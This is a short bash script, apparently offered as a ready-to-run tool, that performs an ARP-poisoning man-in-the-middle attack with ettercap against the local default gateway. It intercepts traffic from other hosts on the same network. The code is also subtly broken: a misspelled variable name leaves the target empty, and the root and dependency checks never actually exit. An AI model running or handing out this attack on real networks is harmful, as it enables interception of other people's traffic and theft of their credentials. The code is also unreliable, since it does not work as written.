#!/bin/bash

#MiTM attack using  ettercap

[ $(whoami) != "root" ] &&  echo "[!] run this script with sudo" exit 99 
#checks if the user is root or has sudo permissions^
[ -x $(command -v ettercap) ] || echo "[!] ettercap not installed" exit 98
#checks if ettercap is installed^
[ -x $(command -v ip) ] || echo "[!] ip is not installed" exit 96
#checks if ip is installed^
your_interface=$(ip -4 route show default | awk '{print $5}')
routers_ip=$(ip route show | grep -i 'default via'| awk '{print $3 }')
sudo ettercap -T -S -i "$your_interface" -M arp:remote /"$rooters_ip"// 
